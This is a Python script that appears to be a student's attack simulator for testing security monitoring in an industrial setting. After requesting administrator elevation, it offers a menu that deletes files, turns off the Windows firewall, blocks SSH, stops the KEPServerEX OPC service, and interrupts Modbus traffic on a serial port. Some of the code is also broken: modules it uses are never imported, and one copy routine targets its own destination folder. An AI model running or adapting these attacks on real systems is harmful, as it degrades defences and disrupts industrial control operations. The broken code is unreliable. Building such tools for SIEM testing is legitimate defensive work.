#import os
from os import walk, path, remove, system, getcwd
#import time
from time import sleep
import threading
from shutil import copyfile
from subprocess import run, check_call, CalledProcessError
from ctypes import windll
from sys import executable

testpath = "C:\\Users\\Jacob\\Desktop\\School\\ITP\\TestFolder" # Put Original directory (Documents folder)
copiedpath = "C:\\Users\\Jacob\\Desktop\\School\\ITP\\TestFolder2" # Put shared directory

#Check if administrator
def check_admin():
    try:
        isAdmin = windll.shell32.IsUserAnAdmin()
    except AttributeError:
        isAdmin = False
    if not isAdmin:
        windll.shell32.ShellExecuteW(None, "runas", executable, __file__, None, 1)

#Delete file in specific folder
def delete_files(folder_path):
    while True:
        for root, dirs, files in walk(folder_path):
            for file in files:
                og = path.join(root, file)
                dest = path.join(copiedpath, file)
                copyfile(og,dest)
                remove(og)
        sleep(5)

def copy_file(folder_path):
    while True:
        for root, dirs, files in walk(folder_path):
            for file in files:
                og = path.join(root, file)
                dest = path.join(copiedpath, file)
                copyfile(og,dest)
        sleep(5)

    

#Disable firewall
def disable_firewall():
    run('netsh advfirewall set allprofiles state off', shell=True)

#Disable ssh from firewall
def disable_ssh():
    run('netsh advfirewall firewall add rule name="QRadar Test" dir=in action=block protocol=TCP localport=22')
    run('netsh advfirewall firewall add rule name="QRadar Test2" dir=in action=block protocol=UDP localport=22')

#Disable Kepserver Service
def disable_kepserver():
    service_name = "KEPServerEXV6"
    run(["sc", "stop", service_name], check=False)

#Run modpoll to interrupt COM1 port
def run_modinterrup():
    current_directory = os.getcwd()
    executable_path = current_directory + "\\modpoll.exe"
    parameters = ["-b", "9600", "-p", "none", "-m", "rtu", "-a", "2 COM1"]
    try:
        subprocess.check_call([executable_path] + parameters)
    except subprocess.CalledProcessError as e:
        print("Error executing the executable file:", e)


if __name__ == '__main__':
    check_admin()
    while True:
        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to exit.")
        attackoption = input("Choose your option:")
        if attackoption == "1":
            delete_files(testpath)
        elif attackoption == "2":
            copy_file(copiedpath)
        elif attackoption == "3":
            disable_firewall()
        elif attackoption == "4":
            disable_ssh()
        elif attackoption == "5":
            disable_kepserver()
        elif attackoption == "6":
            run_modinterrup()
        elif attackoption == "7":
            break
        else:
            print ("Invalid Option!")
            continue
